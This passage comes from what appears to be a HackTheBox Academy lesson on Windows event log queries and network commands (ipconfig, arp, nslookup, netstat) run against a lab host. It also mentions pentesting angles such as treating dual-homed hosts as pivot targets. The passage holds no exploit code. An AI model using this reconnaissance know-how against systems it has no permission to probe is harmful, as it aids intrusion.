        Logon ID:               <span class="hljs-number">0</span>x8E787

Logon <span class="hljs-keyword">Type</span>:                     <span class="hljs-number">5</span>

This <span class="hljs-keyword">event</span> <span class="hljs-keyword">is</span> generated when a logon session <span class="hljs-keyword">is</span> destroyed. It may be positively correlated <span class="hljs-keyword">with</span> a logon <span class="hljs-keyword">event</span> <span class="hljs-keyword">using</span> the Logon ID value. Logon IDs are only unique between reboots <span class="hljs-keyword">on</span> the same computer.
Special privileges assigned <span class="hljs-keyword">to</span> <span class="hljs-keyword">new</span> logon.

Subject:
        Security ID:            S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">18</span>
        Account Name:           SYSTEM
        Account Domain:         NT AUTHORITY
        Logon ID:               <span class="hljs-number">0</span>x3E7

Privileges:             SeAssignPrimaryTokenPrivilege
                        SeTcbPrivilege
                        SeSecurityPrivilege
                        SeTakeOwnershipPrivilege
                        SeLoadDriverPrivilege
                        SeBackupPrivilege
                        SeRestorePrivilege
                        SeDebugPrivilege
                        SeAuditPrivilege
                        SeSystemEnvironmentPrivilege
                        SeImpersonatePrivilege
                        SeDelegateSessionUserImpersonatePrivilege
An account was successfully logged <span class="hljs-keyword">on</span>.

&lt;SNIP&gt;
</code></pre>
<p>We can dig deeper and look at specific event IDs in specific logs. Let&#39;s say we only want to look at logon failures in the Security log, checking for Event ID <a href="https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4625">4625: An account failed to log on</a>. From here, we could use the <code>-ExpandProperty</code> parameter to dig deeper into specific events, list logs from oldest to newest, etc.</p>
<p><strong>Filtering for Logon Failures</strong></p>
<p>Working with the Windows Event Log</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; Get<span class="hljs-params">-WinEvent</span> <span class="hljs-params">-FilterHashTable</span> @{LogName=<span class="hljs-string">'Security'</span>;ID=<span class="hljs-string">'4625 '</span>}

   ProviderName: Microsoft<span class="hljs-params">-Windows</span><span class="hljs-params">-Security</span><span class="hljs-params">-Auditing</span>

TimeCreated                      Id LevelDisplayName Message
-----------                      -- ---------------- -------
<span class="hljs-number">11</span>/<span class="hljs-number">16</span>/<span class="hljs-number">2022</span> <span class="hljs-number">2</span>:<span class="hljs-number">53</span>:<span class="hljs-number">16</span> PM          <span class="hljs-number">4625</span> Information      An account failed <span class="hljs-keyword">to</span> <span class="hljs-keyword">log</span> <span class="hljs-keyword">on</span><span class="hljs-params">...</span>.  
<span class="hljs-number">11</span>/<span class="hljs-number">16</span>/<span class="hljs-number">2022</span> <span class="hljs-number">2</span>:<span class="hljs-number">53</span>:<span class="hljs-number">16</span> PM          <span class="hljs-number">4625</span> Information      An account failed <span class="hljs-keyword">to</span> <span class="hljs-keyword">log</span> <span class="hljs-keyword">on</span><span class="hljs-params">...</span>. 
<span class="hljs-number">11</span>/<span class="hljs-number">16</span>/<span class="hljs-number">2022</span> <span class="hljs-number">2</span>:<span class="hljs-number">53</span>:<span class="hljs-number">12</span> PM          <span class="hljs-number">4625</span> Information      An account failed <span class="hljs-keyword">to</span> <span class="hljs-keyword">log</span> <span class="hljs-keyword">on</span><span class="hljs-params">...</span>. 
<span class="hljs-number">11</span>/<span class="hljs-number">16</span>/<span class="hljs-number">2022</span> <span class="hljs-number">2</span>:<span class="hljs-number">50</span>:<span class="hljs-number">36</span> PM          <span class="hljs-number">4625</span> Information      An account failed <span class="hljs-keyword">to</span> <span class="hljs-keyword">log</span> <span class="hljs-keyword">on</span><span class="hljs-params">...</span>. 
<span class="hljs-number">11</span>/<span class="hljs-number">16</span>/<span class="hljs-number">2022</span> <span class="hljs-number">2</span>:<span class="hljs-number">50</span>:<span class="hljs-number">29</span> PM          <span class="hljs-number">4625</span> Information      An account failed <span class="hljs-keyword">to</span> <span class="hljs-keyword">log</span> <span class="hljs-keyword">on</span><span class="hljs-params">...</span>. 
<span class="hljs-number">11</span>/<span class="hljs-number">16</span>/<span class="hljs-number">2022</span> <span class="hljs-number">2</span>:<span class="hljs-number">50</span>:<span class="hljs-number">21</span> PM          <span class="hljs-number">4625</span> Information      An account failed <span class="hljs-keyword">to</span> <span class="hljs-keyword">log</span> <span class="hljs-keyword">on</span><span class="hljs-params">...</span>.

&lt;SNIP&gt;
</code></pre>
<p>We can also look at only events with a specific information level. Let&#39;s check all System logs for only <code>critical</code> events with information level <code>1</code>. Here we see just one log entry where the system did not reboot cleanly.</p>
<p>Working with the Windows Event Log</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; Get-WinEvent -FilterHashTable @{LogName=<span class="hljs-string">'System'</span>;Level=<span class="hljs-string">'1'</span>} | <span class="hljs-keyword">select</span>-object -ExpandProperty Message

The <span class="hljs-built_in">system</span> has rebooted without cleanly shutting down first. This <span class="hljs-built_in">error</span> could be caused <span class="hljs-keyword">if</span> the <span class="hljs-built_in">system</span> stopped responding, crashed, <span class="hljs-built_in">or</span> lost power unexpectedly.
</code></pre>
<p>Practice more with <code>wevtutil</code> and <code>Get-WinEvent</code> to become more comfortable with searching logs. Microsoft provides some <a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.diagnostics/get-winevent?view=powershell-7.3">examples</a> for <code>Get-WinEvent</code>, while <a href="https://www.thewindowsclub.com/what-is-wevtutil-and-how-do-you-use-it">this site</a> shows examples for <code>wevtutil</code>, and <a href="https://4sysops.com/archives/search-the-event-log-with-the-get-winevent-powershell-cmdlet/">this site</a> has some additional examples for using <code>Get-WinEvent</code>.</p>
<hr>
<h3 id="moving-on">Moving On</h3>
<p>This section introduced the Windows Event Log, a vast topic that we will dig much deeper into in later modules. Try out the various examples in this section and get comfortable using both tools to query for specific information. In later modules, we will see how we can sometimes find sensitive data, such as passwords, in Event Logs. Logging on Windows is very powerful when configured properly. Each system generates a massive amount of logs, and, as we saw with all the possible Event IDs, we can get quite granular with what exactly we choose to log. All of this data on its own would be very difficult to constantly query and is most effective when forwarded to a SIEM tool that can be used to set up alerts on specific Event IDs which may be indicative of an attack, such as Kerberoasting, Password Spraying, or other less common attacks. As penetration testers, we should be familiar with Windows Event Log, how we can use it to gain information about the environment, and sometimes even extract sensitive data. For blue teamers, in-depth knowledge of Windows Event Log and how to leverage it for effective alerting and monitoring is critical.</p>
<p>In the next section, we will cover working with networking operations from the command line on a Windows system.</p>
<h2 id="networking-management-from-the-cli">Networking Management from The CLI</h2>
<hr>
<p>PowerShell has expanded our capabilities within the <code>Windows OS</code> when dealing with Networking settings, applications, and more. This section will cover how to check your network settings, such as IP addresses, adapter settings, and DNS settings. We will also cover How to enable and manage remote host access utilizing <code>WinRM</code> and <code>SSH</code>.</p>
<p>Scenario: To ensure Mr. Tanaka&#39;s host is functioning properly and we can manage it from the IT office remotely, we are going to perform a quick checkup, validate his host settings, and enable remote management for the host.</p>
<hr>
<h3 id="what-is-networking-within-a-windows-network-">What Is Networking Within a Windows Network?</h3>
<p>Networking with Windows hosts functions much like any other Linux or Unix-based host. The TCP/IP stack, wireless protocols, and other applications treat most devices the same, so there isn&#39;t much to learn there that&#39;s new. This module assumes you know basic networking protocols and how typical network traffic traverses the Internet. If you wish for a primer on networking, check out the <a href="https://academy.hackthebox.com/course/preview/introduction-to-networking">Introduction to Networking</a> module, or for a more in-depth dissection of network traffic, you can play through the <a href="https://academy.hackthebox.com/course/preview/intro-to-network-traffic-analysis">Introduction to Network Traffic Analysis</a> module. Where things get a bit different lies in how Windows hosts communicate with each other, domains, and other Linux hosts. Below we will quickly cover some standard protocols you could run into when administering or pentesting Windows hosts.</p>
<table>
<thead>
<tr>
<th><strong>Protocol</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>SMB</code></td>
<td><a href="https://learn.microsoft.com/en-us/openspecs/windows\_protocols/ms-smb2/4287490c-602c-41c0-a23e-140a1f137832">SMB</a> provides Windows hosts with the capability to share resources, files, and a standard way of authenticating between hosts to determine if access to resources is allowed. For other distros, SAMBA is the open-source option.</td>
</tr>
<tr>
<td><code>Netbios</code></td>
<td><a href="https://www.ietf.org/rfc/rfc1001.txt">NetBios</a> itself isn&#39;t directly a service or protocol but a connection and conversation mechanism widely used in networks. It was the original transport mechanism for SMB, but that has since changed. Now it serves as an alternate identification mechanism when DNS fails. Can also be known as NBT-NS (NetBIOS name service).</td>
</tr>
<tr>
<td><code>LDAP</code></td>
<td><a href="https://www.rfc-editor.org/rfc/rfc4511">LDAP</a> is an <code>open-source</code> cross-platform protocol used for <code>authentication</code> and <code>authorization</code> with various directory services. This is how many different devices in modern networks can communicate with large directory structure services such as <code>Active Directory</code>.</td>
</tr>
<tr>
<td><code>LLMNR</code></td>
<td><a href="https://www.rfc-editor.org/rfc/rfc4795">LLMNR</a> provides a name resolution service based on DNS and works if DNS is not available or functioning. This protocol is a multicast protocol and, as such, works only on local links ( within a normal broadcast domain, not across layer three links).</td>
</tr>
<tr>
<td><code>DNS</code></td>
<td><a href="https://datatracker.ietf.org/doc/html/rfc1034">DNS</a> is a common naming standard used across the Internet and in most modern network types. DNS allows us to reference hosts by a unique name instead of their IP address. This is how we can reference a website by &quot;WWW.google.com&quot; instead of &quot;8.8.8.8&quot;. Internally this is how we request resources and access from a network.</td>
</tr>
<tr>
<td><code>HTTP/HTTPS</code></td>
<td><a href="https://www.rfc-editor.org/rfc/rfc2818">HTTP/S</a> HTTP and HTTPS are the insecure and secure way we request and utilize resources over the Internet. These protocols are used to access and utilize resources such as web servers, send and receive data from remote sources, and much more.</td>
</tr>
<tr>
<td><code>Kerberos</code></td>
<td><a href="https://web.mit.edu/kerberos/">Kerberos</a> is a network level authentication protocol. In modern times, we are most likely to see it when dealing with Active Directory authentication when clients request tickets for authorization to use domain resources.</td>
</tr>
<tr>
<td><code>WinRM</code></td>
<td><a href="https://learn.microsoft.com/en-us/windows/win32/winrm/portal">WinRM</a> Is an implementation of the WS-Management protocol. It can be used to manage the hardware and software functionalities of hosts. It is mainly used in IT administration but can also be used for host enumeration and as a scripting engine.</td>
</tr>
<tr>
<td><code>RDP</code></td>
<td><a href="https://learn.microsoft.com/en-us/windows-server/remote/remote-desktop-services/rds-plan-access-from-anywhere">RDP</a> is a Windows implementation of a network UI services protocol that provides users with a Graphical interface to access hosts over a network connection. This allows for full UI use to include the passing of keyboard and mouse input to the remote host.</td>
</tr>
<tr>
<td><code>SSH</code></td>
<td><a href="https://datatracker.ietf.org/doc/html/rfc4251">SSH</a> is a secure protocol that can be used for secure host access, transfer of files, and general communication between network hosts. It provides a way to securely access hosts and services over insecure networks.</td>
</tr>
</tbody>
</table>
<p>Of course, this list is not all-encompassing, but it is an excellent general start of what we would typically see when communicating with Windows hosts. Now let&#39;s discuss local access vs. remote access.</p>
<hr>
<h3 id="local-vs-remote-access-">Local vs. Remote Access?</h3>
<h4 id="local-access">Local Access</h4>
<p>Local host access is when we are directly at the terminal utilizing its resources as you are right now from your PC. Usually, this will not require us to use any specific access protocols except when we request resources from networked hosts or attempt to access the Internet. Below we will showcase some cmdlets and other ways to check and validate network settings on our hosts.</p>
<h4 id="querying-networking-settings">Querying Networking Settings</h4>
<p>Before doing anything else, let&#39;s validate the network settings on Mr. Tanaka&#39;s host. We will start by running the <code>IPConfig</code> command. This isn&#39;t a PowerShell native command, but it is compatible.</p>
<p><strong>IPConfig</strong></p>
<p>Networking Management from The CLI</p>
<pre><code class="lang-powershell-session"><span class="hljs-selector-tag">PS</span> <span class="hljs-selector-tag">C</span>:\<span class="hljs-selector-tag">htb</span>&gt; <span class="hljs-selector-tag">ipconfig</span> 

<span class="hljs-selector-tag">Windows</span> <span class="hljs-selector-tag">IP</span> <span class="hljs-selector-tag">Configuration</span>

<span class="hljs-selector-tag">Ethernet</span> <span class="hljs-selector-tag">adapter</span> <span class="hljs-selector-tag">Ethernet0</span>:

   <span class="hljs-selector-tag">Connection-specific</span> <span class="hljs-selector-tag">DNS</span> <span class="hljs-selector-tag">Suffix</span>  . : <span class="hljs-selector-class">.htb</span>
   <span class="hljs-selector-tag">Link-local</span> <span class="hljs-selector-tag">IPv6</span> <span class="hljs-selector-tag">Address</span> . . . . . : <span class="hljs-selector-tag">fe80</span><span class="hljs-selector-pseudo">::c5ca</span><span class="hljs-selector-pseudo">:594d</span><span class="hljs-selector-pseudo">:759d</span><span class="hljs-selector-pseudo">:e0c1</span>%11
   <span class="hljs-selector-tag">IPv4</span> <span class="hljs-selector-tag">Address</span>. . . . . . . . . . . : 10<span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.203</span><span class="hljs-selector-class">.105</span>
   <span class="hljs-selector-tag">Subnet</span> <span class="hljs-selector-tag">Mask</span> . . . . . . . . . . . : 255<span class="hljs-selector-class">.255</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span>
   <span class="hljs-selector-tag">Default</span> <span class="hljs-selector-tag">Gateway</span> . . . . . . . . . : <span class="hljs-selector-tag">fe80</span><span class="hljs-selector-pseudo">::250</span><span class="hljs-selector-pseudo">:56ff</span><span class="hljs-selector-pseudo">:feb9</span><span class="hljs-selector-pseudo">:b9fc</span>%11
                                       10<span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.1</span>
</code></pre>
<p>As we can see, <code>ipconfig</code> will show us the basic settings of your network interface. We have as output the IPv4/6 addresses, our gateway, subnet masks, and DNS suffix if one is set. We can output the full network settings by appending the <code>/all</code> modifier to the ipconfig command like so:</p>
<p>Networking Management from The CLI</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; ipconfig /<span class="hljs-keyword">all</span> 

Windows IP Configuration

   Host Name . . . . . . . . . . . . : <span class="hljs-type">ICL</span>-WIN11
   Primary Dns Suffix  . . . . . . . : <span class="hljs-type">greenhorn.corp</span>
   Node <span class="hljs-keyword">Type</span> <span class="hljs-type">. </span>. . . . . . . . . . . : <span class="hljs-type">Hybrid</span>
   IP Routing Enabled. . . . . . . . : <span class="hljs-type">No</span>
   WINS Proxy Enabled. . . . . . . . : <span class="hljs-type">No</span>
   DNS Suffix Search List. . . . . . : <span class="hljs-type">greenhorn.corp</span>
                                       htb

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : .<span class="hljs-type">htb</span>
   Description . . . . . . . . . . . : <span class="hljs-type">vmxnet3</span> Ethernet Adapter
   Physical Address. . . . . . . . . : 00-50-56-<span class="hljs-type">B9</span>-<span class="hljs-number">4</span>F-CB
   DHCP Enabled. . . . . . . . . . . : <span class="hljs-type">Yes</span>
   Autoconfiguration Enabled . . . . : <span class="hljs-type">Yes</span>
   IPv6 Address. . . . . . . . . . . : <span class="hljs-type">dead</span>:beef::<span class="hljs-number">222</span>(Preferred)
   Lease Obtained. . . . . . . . . . : <span class="hljs-type">Monday</span>, October <span class="hljs-number">17</span>, <span class="hljs-number">2022</span> <span class="hljs-number">9</span>:<span class="hljs-number">40</span>:<span class="hljs-number">14</span> AM
   Lease Expires . . . . . . . . . . : <span class="hljs-type">Tuesday</span>, October <span class="hljs-number">25</span>, <span class="hljs-number">2022</span> <span class="hljs-number">9</span>:<span class="hljs-number">59</span>:<span class="hljs-number">17</span> AM
   &lt;SNIP&gt;
   IPv4 Address. . . . . . . . . . . : 10.129.203.105(<span class="hljs-type">Preferred</span>)
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Lease Obtained. . . . . . . . . . : <span class="hljs-type">Monday</span>, October <span class="hljs-number">17</span>, <span class="hljs-number">2022</span> <span class="hljs-number">9</span>:<span class="hljs-number">40</span>:<span class="hljs-number">13</span> AM
   Lease Expires . . . . . . . . . . : <span class="hljs-type">Tuesday</span>, October <span class="hljs-number">25</span>, <span class="hljs-number">2022</span> <span class="hljs-number">10</span>:<span class="hljs-number">10</span>:<span class="hljs-number">16</span> AM
   Default Gateway . . . . . . . . . : <span class="hljs-type">fe80</span>::<span class="hljs-number">250</span>:<span class="hljs-number">56</span>ff:feb9:b9fc%<span class="hljs-number">11</span>
                                       <span class="hljs-number">10.129</span>.<span class="hljs-number">0.1</span>
   DHCP Server . . . . . . . . . . . : 10.129.0.1
   DHCPv6 IAID . . . . . . . . . . . : 335564886
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-2<span class="hljs-type">A</span>-<span class="hljs-number">3</span>D-<span class="hljs-number">00</span>-D6-<span class="hljs-number">00</span>-<span class="hljs-number">50</span>-<span class="hljs-number">56</span>-B9-<span class="hljs-number">4</span>F-CB
   DNS Servers . . . . . . . . . . . : 1.1.1.1
                                       <span class="hljs-number">8.8</span>.<span class="hljs-number">8.8</span>
   NetBIOS over Tcpip. . . . . . . . : <span class="hljs-type">Enabled</span>
   Connection-specific DNS Suffix Search List :
                                       <span class="hljs-type">htb</span>

Ethernet adapter Ethernet2:

   Connection-specific DNS Suffix  . :
   <span class="hljs-type">Description</span> . . . . . . . . . . . : <span class="hljs-type">vmxnet3</span> Ethernet Adapter #<span class="hljs-number">2</span>
   Physical Address. . . . . . . . . : 00-50-56-<span class="hljs-type">B9</span>-F5-<span class="hljs-number">7</span>E
   DHCP Enabled. . . . . . . . . . . : <span class="hljs-type">No</span>
   Autoconfiguration Enabled . . . . : <span class="hljs-type">Yes</span>
   Link-local IPv6 Address . . . . . : <span class="hljs-type">fe80</span>::d1fb:<span class="hljs-number">79</span>d5:<span class="hljs-number">6</span>d0b:<span class="hljs-number">41</span>de%<span class="hljs-number">14</span>(Preferred)
   IPv4 Address. . . . . . . . . . . : 172.16.5.100(<span class="hljs-type">Preferred</span>)
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 172.16.5.1
   DHCPv6 IAID . . . . . . . . . . . : 318787670
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-2<span class="hljs-type">A</span>-<span class="hljs-number">3</span>D-<span class="hljs-number">00</span>-D6-<span class="hljs-number">00</span>-<span class="hljs-number">50</span>-<span class="hljs-number">56</span>-B9-<span class="hljs-number">4</span>F-CB
   DNS Servers . . . . . . . . . . . : 172.16.5.155
   NetBIOS over Tcpip. . . . . . . . : <span class="hljs-type">Enabled</span>
</code></pre>
<p>Now we can see much more information than before. We are presented with output containing multiple adapters, <code>Host settings</code>, more details about if our IP addresses were <code>manually</code> set or <code>DHCP leases</code>, how long those leases are, and more. So, it appears Mr. Tanaka&#39;s host has a proper IP address configuration. Of note, and particularly interesting to us as pentesters, is that this host is dual-homed. We mean it has multiple network interfaces connected to separate networks. This makes Mr. Tanakas host a great target if we are looking for a foothold in the network and wish to have a way to migrate between networks.</p>
<p>Let&#39;s look at <code>Arp</code> settings and see if his host has communicated with others on the network. As a refresher, ARP is a protocol utilized to <code>translate IP addresses to Physical addresses</code>. The physical address is used at lower levels of the <code>OSI/TCP-IP</code> models for communication. To have it display the host&#39;s current ARP entries, we will use the <code>-a</code> switch.</p>
<p><strong>ARP</strong></p>
<p>Networking Management from The CLI</p>
<pre><code class="lang-powershell-session"><span class="hljs-selector-tag">PS</span> <span class="hljs-selector-tag">C</span>:\<span class="hljs-selector-tag">htb</span>&gt; <span class="hljs-selector-tag">arp</span> <span class="hljs-selector-tag">-a</span>

<span class="hljs-selector-tag">Interface</span>: 10<span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.203</span><span class="hljs-selector-class">.105</span> <span class="hljs-selector-tag">---</span> 0<span class="hljs-selector-tag">xb</span>
  <span class="hljs-selector-tag">Internet</span> <span class="hljs-selector-tag">Address</span>      <span class="hljs-selector-tag">Physical</span> <span class="hljs-selector-tag">Address</span>      <span class="hljs-selector-tag">Type</span>
  10<span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.1</span>            00<span class="hljs-selector-tag">-50-56-b9-b9-fc</span>     <span class="hljs-selector-tag">dynamic</span>
  10<span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.204</span><span class="hljs-selector-class">.58</span>         00<span class="hljs-selector-tag">-50-56-b9-5f-41</span>     <span class="hljs-selector-tag">dynamic</span>
  10<span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.255</span><span class="hljs-selector-class">.255</span>        <span class="hljs-selector-tag">ff-ff-ff-ff-ff-ff</span>     <span class="hljs-selector-tag">static</span>
  224<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.22</span>            01<span class="hljs-selector-tag">-00-5e-00-00-16</span>     <span class="hljs-selector-tag">static</span>
  224<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.251</span>           01<span class="hljs-selector-tag">-00-5e-00-00-fb</span>     <span class="hljs-selector-tag">static</span>
  224<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.252</span>           01<span class="hljs-selector-tag">-00-5e-00-00-fc</span>     <span class="hljs-selector-tag">static</span>
  239<span class="hljs-selector-class">.255</span><span class="hljs-selector-class">.255</span><span class="hljs-selector-class">.250</span>       01<span class="hljs-selector-tag">-00-5e-7f-ff-fa</span>     <span class="hljs-selector-tag">static</span>
  255<span class="hljs-selector-class">.255</span><span class="hljs-selector-class">.255</span><span class="hljs-selector-class">.255</span>       <span class="hljs-selector-tag">ff-ff-ff-ff-ff-ff</span>     <span class="hljs-selector-tag">static</span>

<span class="hljs-selector-tag">Interface</span>: 172<span class="hljs-selector-class">.16</span><span class="hljs-selector-class">.5</span><span class="hljs-selector-class">.100</span> <span class="hljs-selector-tag">---</span> 0<span class="hljs-selector-tag">xe</span>
  <span class="hljs-selector-tag">Internet</span> <span class="hljs-selector-tag">Address</span>      <span class="hljs-selector-tag">Physical</span> <span class="hljs-selector-tag">Address</span>      <span class="hljs-selector-tag">Type</span>
  172<span class="hljs-selector-class">.16</span><span class="hljs-selector-class">.5</span><span class="hljs-selector-class">.155</span>          00<span class="hljs-selector-tag">-50-56-b9-e2-30</span>     <span class="hljs-selector-tag">dynamic</span>
  172<span class="hljs-selector-class">.16</span><span class="hljs-selector-class">.5</span><span class="hljs-selector-class">.255</span>          <span class="hljs-selector-tag">ff-ff-ff-ff-ff-ff</span>     <span class="hljs-selector-tag">static</span>
  224<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.22</span>            01<span class="hljs-selector-tag">-00-5e-00-00-16</span>     <span class="hljs-selector-tag">static</span>
  224<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.251</span>           01<span class="hljs-selector-tag">-00-5e-00-00-fb</span>     <span class="hljs-selector-tag">static</span>
  224<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.252</span>           01<span class="hljs-selector-tag">-00-5e-00-00-fc</span>     <span class="hljs-selector-tag">static</span>
  239<span class="hljs-selector-class">.255</span><span class="hljs-selector-class">.255</span><span class="hljs-selector-class">.250</span>       01<span class="hljs-selector-tag">-00-5e-7f-ff-fa</span>     <span class="hljs-selector-tag">static</span>
</code></pre>
<p>The output from <code>Arp -a</code> is pretty simple. We are provided with entries from our network adapters about the hosts it is aware of or has communicated with recently. Not surprisingly, since this host is fairly new, it has yet to communicate with too many hosts. Just the gateways, our remote host, and the host 172.16.5.155, the <code>Domain Controller</code> for <code>Greenhorn.corp</code>. Nothing crazy to be seen here. Now let&#39;s validate our DNS configuration is working properly. We will utilize <code>nslookup</code>, a built-in DNS querying tool, to attempt to resolve the IP address / DNS name of the Greenhorn domain controller.</p>
<p><strong>Nslookup</strong></p>
<p>Networking Management from The CLI</p>
<pre><code class="lang-powershell-session"><span class="hljs-selector-tag">PS</span> <span class="hljs-selector-tag">C</span>:\<span class="hljs-selector-tag">htb</span>&gt; <span class="hljs-selector-tag">nslookup</span> <span class="hljs-selector-tag">ACADEMY-ICL-DC</span>

<span class="hljs-selector-tag">DNS</span> <span class="hljs-selector-tag">request</span> <span class="hljs-selector-tag">timed</span> <span class="hljs-selector-tag">out</span>.
    <span class="hljs-selector-tag">timeout</span> <span class="hljs-selector-tag">was</span> 2 <span class="hljs-selector-tag">seconds</span>.
<span class="hljs-selector-tag">Server</span>:  <span class="hljs-selector-tag">UnKnown</span>
<span class="hljs-selector-tag">Address</span>:  172<span class="hljs-selector-class">.16</span><span class="hljs-selector-class">.5</span><span class="hljs-selector-class">.155</span>

<span class="hljs-selector-tag">Name</span>:    <span class="hljs-selector-tag">ACADEMY-ICL-DC</span><span class="hljs-selector-class">.greenhorn</span><span class="hljs-selector-class">.corp</span>
<span class="hljs-selector-tag">Address</span>:  172<span class="hljs-selector-class">.16</span><span class="hljs-selector-class">.5</span><span class="hljs-selector-class">.155</span>
</code></pre>
<p>Now that we have validated Mr. Tanakas DNS settings, let&#39;s check the open ports on the host. We can do so using <code>netstat -an</code>. Netstat will display current network connections to our host. The <code>-an</code> switch will print all connections and listening ports and place them in numerical form.</p>
<p><strong>Netstat</strong></p>
<p>Networking Management from The CLI</p>
<pre><code class="lang-powershell-session"><span class="hljs-selector-tag">PS</span> <span class="hljs-selector-tag">C</span>:\<span class="hljs-selector-tag">htb</span>&gt; <span class="hljs-selector-tag">netstat</span> <span class="hljs-selector-tag">-an</span> 

<span class="hljs-selector-tag">netstat</span> <span class="hljs-selector-tag">-an</span>

<span class="hljs-selector-tag">Active</span> <span class="hljs-selector-tag">Connections</span>

  <span class="hljs-selector-tag">Proto</span>  <span class="hljs-selector-tag">Local</span> <span class="hljs-selector-tag">Address</span>          <span class="hljs-selector-tag">Foreign</span> <span class="hljs-selector-tag">Address</span>        <span class="hljs-selector-tag">State</span>
  <span class="hljs-selector-tag">TCP</span>    0<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-pseudo">:22</span>             0<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-pseudo">:0</span>              <span class="hljs-selector-tag">LISTENING</span>
  <span class="hljs-selector-tag">TCP</span>    0<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-pseudo">:135</span>            0<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-pseudo">:0</span>              <span class="hljs-selector-tag">LISTENING</span>
  <span class="hljs-selector-tag">TCP</span>    0<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-pseudo">:445</span>            0<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-pseudo">:0</span>              <span class="hljs-selector-tag">LISTENING</span>
  <span class="hljs-selector-tag">TCP</span>    0<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-pseudo">:3389</span>           0<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-pseudo">:0</span>              <span class="hljs-selector-tag">LISTENING</span>
  <span class="hljs-selector-tag">TCP</span>    0<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-pseudo">:5040</span>           0<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-pseudo">:0</span>              <span class="hljs-selector-tag">LISTENING</span>
  <span class="hljs-selector-tag">TCP</span>    0<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-pseudo">:5985</span>           0<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-pseudo">:0</span>              <span class="hljs-selector-tag">LISTENING</span>
  <span class="hljs-selector-tag">TCP</span>    0<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-pseudo">:47001</span>          0<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-pseudo">:0</span>              <span class="hljs-selector-tag">LISTENING</span>
  <span class="hljs-selector-tag">TCP</span>    0<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-pseudo">:49664</span>          0<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-pseudo">:0</span>              <span class="hljs-selector-tag">LISTENING</span>
  <span class="hljs-selector-tag">TCP</span>    0<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-pseudo">:49665</span>          0<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-pseudo">:0</span>              <span class="hljs-selector-tag">LISTENING</span>
  <span class="hljs-selector-tag">TCP</span>    0<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-pseudo">:49666</span>          0<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-pseudo">:0</span>              <span class="hljs-selector-tag">LISTENING</span>
  <span class="hljs-selector-tag">TCP</span>    0<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-pseudo">:49667</span>          0<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-pseudo">:0</span>              <span class="hljs-selector-tag">LISTENING</span>
